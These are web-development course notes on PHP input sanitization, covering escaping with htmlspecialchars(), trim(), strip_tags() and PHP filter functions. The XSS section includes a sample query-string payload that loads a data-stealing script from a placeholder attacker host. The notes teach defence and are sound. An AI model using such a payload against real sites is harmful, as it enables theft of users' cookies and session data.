---
layout: base
title: PHP - Sanitization
course: SDEV255
---

- [Sanitization](#sanitization)
  - [Validation vs Sanitization](#validation-vs-sanitization)
  - [Purpose of Sanitization](#purpose-of-sanitization)
  - [Escaping Values](#escaping-values)
    - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
      - [How XSS Works](#how-xss-works)
      - [XSS Example](#xss-example)
    - [htmlspecialchars()](#htmlspecialchars)
  - [Removing Unwanted Values](#removing-unwanted-values)
    - [trim()](#trim)
    - [strip_tags()](#strip_tags)
  - [Filter Functions](#filter-functions)
    - [Validate Filters](#validate-filters)
    - [Sanitize Filters](#sanitize-filters)
    - [Filtering a Single Value](#filtering-a-single-value)
    - [Sanitizing a Single Value](#sanitizing-a-single-value)
    - [Filter Flags and Options](#filter-flags-and-options)
    - [Filtering a Single Value with Options](#filtering-a-single-value-with-options)
    - [Filtering Multiple Values](#filtering-multiple-values)
    - [Demos - Complete Form Validation with Filters](#demos---complete-form-validation-with-filters)
  - [Topics for Later](#topics-for-later)

# Sanitization

## Validation vs Sanitization

**Validation** - is the process of ensuring that the input matches the expected format, range, type, length, etc.

**Sanitization** - is the process of removing unwanted characters, whitespace, HTML tags, etc.

## Purpose of Sanitization

- Prevents malicious code from being injected into application
- Prevents unwanted characters from being
  - Displayed to the user
  - Stored in database
  - Stored in files
  - Sent to other applications

## Escaping Values

**Escaping** - is the process of converting special characters to their HTML entity equivalents.

### Cross-Site Scripting (XSS)

**Cross-Site Scripting (XSS)** - is a type of injection attack where malicious scripts are injected into trusted websites.

The scripts may then:

- Steal cookies and session tokens
- Redirect the user to another website
- Send content to other applications

#### How XSS Works

1. Hacker visits a website and probes for query string vulnerabilities.
<figure>
    <span>
        <img src="images/hacker.jpg" style="width:40%;">
    </span>
</figure>

2. Hacker finds query string named `q` is not sanitized.

3. Hacker tricks other people into visiting website with following query string: `q=<script src=http://really-terrible-site/steal-data.js></script>`

4. JS file runs on victim's browser and sends data to hacker's website.

5. Hacker sells data on the dark web and buys yacht.

<figure>
    <span>
        <img src="https://media.boatsnews.com/src/images/news/articles/ima-computer-science-screen-37738.webp" style="width:40%">
    </span>
</figure>

#### XSS Example

<p class="demo">Walkthrough</p>

[Text: Example of an XSS Attack](http://localhost/phpbook/section_b/c06/)

### htmlspecialchars()

- Converts special characters to HTML entities
- May optionally specify which characters to convert and the character encoding

```php
$input = '<script>alert("XSS");</script>';
<p><?php echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8'); ?></p
```

## Removing Unwanted Values

### trim()

- Removes whitespace from beginning and end of a string
- May optionally specify which characters to remove

```php
$cleanedInput = trim($userInput);
```

### strip_tags()

- Removes HTML tags from a string
- May optionally specify which tags to allow

```php
$cleanedInput = strip_tags($userInput);
```

## Filter Functions

PHP has built-in functions for validating and sanitizing input.

### Validate Filters

Validate filters are used to validate input.

See [PHP: Validate filters](https://www.php.net/manual/en/filter.filters.validate.php)

### Sanitize Filters

Sanitize filters are used to remove unwanted characters.

See [PHP: Sanitize filters](https://www.php.net/manual/en/filter.filters.sanitize.php)

### Filtering a Single Value

```php
// Will return false if value is not valid
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
```

### Sanitizing a Single Value

```php
// Same effect as htmlspecialchars() with ENT_QUOTES flag
$filtered = filter_input(INPUT_POST, 'val', FILTER_SANITIZE_FULL_SPECIAL_CHARS);
```

### Filter Flags and Options

- Filter flags and options are used to specify how the filter should behave.
- Flags are predefined constants that can be combined using the bitwise OR operator `|`.
- Options are key/value pairs that are passed in an array.
- See [PHP: Filter Flags](https://www.php.net/manual/en/filter.filters.flags.php)

### Filtering a Single Value with Options

```php
// Build options array
$settings['flags']                = FILTER_FLAG_ALLOW_HEX;       // Allow hex flag
$settings['options']['default']   = 0;                           // Default value
$settings['options']['min_range'] = 0;                           // Min number option
$settings['options']['max_range'] = 255;                         // Max number option

// Will return false if value is not between 0 and 255
$number = filter_input(INPUT_POST, 'number', FILTER_VALIDATE_INT, $settings);
```

### Filtering Multiple Values

- We often want to filter multiple values at once, as in the case of a form submission.

```html
<form action="process.php" method="post">
  <input type="text" name="email" />
  <input type="text" name="age" />
  <input type="checkbox" name="terms" />
  <input type="submit" />
</form>
```

```php
// Build filters array
$filters['email']                       = FILTER_VALIDATE_EMAIL;   // Email filter
$filters['age']['filter']               = FILTER_VALIDATE_INT;     // Integer filter
$filters['age']['options']['min_range'] = 16;                      // Min age
$filters['terms']                       = FILTER_VALIDATE_BOOLEAN; // Boolean filter

$form = filter_input_array(INPUT_POST, $filters);                  // Apply filters
var_dump($form);                                                   // Display results
```

### Demos - Complete Form Validation with Filters

<p class="demo">Walkthrough</p>

[Complete Form Validation](https://github.com/mpjovanovich/ivy_tech/blob/main/SDEV255_Web_Application_Development/form_filters_demo/form_filters_demo.php)

## Topics for Later

We have not covered these yet, but santization is also important for:

- Database queries
- File uploads
